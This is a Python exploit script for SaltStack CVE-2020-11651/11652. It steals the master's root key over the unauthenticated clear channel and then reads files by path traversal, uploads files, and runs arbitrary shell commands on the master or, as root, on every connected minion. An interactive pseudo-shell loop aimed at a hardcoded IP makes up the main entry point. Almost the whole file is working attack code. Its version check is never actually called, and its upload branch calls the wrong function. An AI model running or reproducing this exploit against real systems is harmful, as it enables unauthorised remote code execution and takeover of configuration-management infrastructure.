#!/usr/bin/env python3
# Date: 2020-06-21
###################################Saltstack 3000.1_rce##################################################
# Version: < 3000.2, < 2019.2.4, 2017.*, 2018.*
import datetime
import time
import salt
import salt.version
import salt.transport.client
import salt.exceptions
import sys

# --- check funcs ----
def check_salt_version():
    print("[+] Salt version: {}".format(salt.version.__version__))
    vi = salt.version.__version_info__
    if (vi < (2019, 2, 4) or (3000,) <= vi < (3000, 2)):
        return True
    else:
        return False

def init_minion(master_ip, master_port):
    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port,
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
    }
    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')


def get_rootkey(clear_channel):
    try:
        response = clear_channel.send({'cmd': '_prep_auth_info'}, timeout=2)
        for i in response:
            if isinstance(i, dict) and len(i) == 1:
                rootkey = list(i.values())[0]
                return rootkey
        return False
    except:
        return False

def pwn_read_file(clear_channel, root_key, read_file, master_ip):
    try:
        #print("[+] There is to read {} from {}".format(read_file, master_ip))
        print("#"*50)
        payload = {
            'key': root_key,
            'cmd': 'wheel',
            'fun': 'file_roots.read',
            'path': read_file,
        }
        rets = clear_channel.send(payload, timeout=3)
        print(list(rets['data']['return'][0].values())[0])
        msg = "[+] There is CVE-2020-11652 of Saltstack Vuln."
        return True,master_ip,msg
    except:
        msg = '[-] There Salt is no Vuln: Read file fail!'
        return False, master_ip, msg

def pwn_upload_file(clear_channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    try:
        fh = open(src, 'rb')
        payload = fh.read()
        fh.close()
    except:
        msg = '[-] There Salt is no Vuln: Failed to read {}: No source file!'.format(src)
        return False,master_ip,msg
    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'data': payload,
        'path': dest,
    }
    rets = clear_channel.send(msg, timeout=3)
    msg = '[+] {}'.format(rets['data']['return'])
    return True,master_ip,msg

def pwn_exec(clear_channel, root_key, cmd, master_ip, jid):
    #print("[+] Attemping to execute {} on master {}".format(cmd, master_ip))
    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }
    try:
        rets = clear_channel.send(msg, timeout=3)
    except:
        msg = '[-] Failed to submit job'
        return False,master_ip,msg
    if rets.get('jid'):
        msg = '[+] Successfully command to master: {} commond: {}'.format(rets['jid'],cmd)
        return True,master_ip,msg
def pwn_exec_all(clear_channel, root_key, cmd, master_ip, jid):
    print("[+] Attemping to execute '{}' on all minions connected to {}".format(cmd, master_ip))
    commmnd = "/bin/sh -c '{}'".format(cmd)
    msg = {
        'key': root_key,
        'cmd': '_send_pub',
        'fun': 'cmd.run',
        'user': 'root',
        'arg': [commmnd],
        'tgt': '*',
        'tgt_type': 'glob',
        'ret': '',
        'jid': jid
    }
    try:
        rets = clear_channel.send(msg, timeout=3)
        if rets == None:
            msg = '[+] Successfully submitted job to all minions: %s'%commmnd
            return True,master_ip,msg
        else:
            msg = '[-] Failed to submit job'
            return False, master_ip, msg
    except:
        msg = '[-] Failed to submit job'
        return False, master_ip, msg


def run(protocol,master_ip,master_port,cmd):
    master_minion_root = "master"
    read_file = ""
    upload_src = ""
    upload_dest = "../../../../../../tmp/2.txt"

    if check_salt_version:
        print("-"*50)
        print("[+] This version of salt is vulnerable! Check results below")
        clear_channel = init_minion(master_ip, master_port.strip())
        root_key = get_rootkey(clear_channel)
        if not root_key:
            msg = "[-] There Salt is no Vuln: Failed to fetch the root key from the instance."
            return False,master_ip,msg
        else:
            if read_file:
                return pwn_read_file(clear_channel, root_key, read_file, master_ip)
            if upload_src:
                return pwn_exec(clear_channel, root_key, upload_src, upload_dest, master_ip)
            jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
            if master_minion_root == "master" or master_minion_root == "minions":
                if  master_minion_root == "master":
                    #return pwn_exec(clear_channel, root_key, cmd, master_ip, jid)
                    if cmd.strip():
                        pwn_exec(clear_channel, root_key, cmd + ">/tmp/hacde_test.txt", master_ip, jid)
                        print("-"*50)
                        time.sleep(1)
                        pwn_read_file(clear_channel, root_key, "../../../../../../../tmp/hacde_test.txt", master_ip)
                else:
                    return pwn_exec_all(clear_channel, root_key, cmd, master_ip, jid)
    else:
        msg = "[-] This version of salt No vulnerable! "
        return False,master_ip,msg

if __name__ == '__main__':
    ip = "     192.168.43.90  "
    print("Please input commond ex:[whoami] .input [exit] to out.")
    while True:
        cmd = str(input(">shell:~$ "))
        if cmd.strip() == "exit":
            exit(1)
        #print(run("http", ip.strip(), "4506", cmd))
        run("http", ip.strip(), "4506", cmd)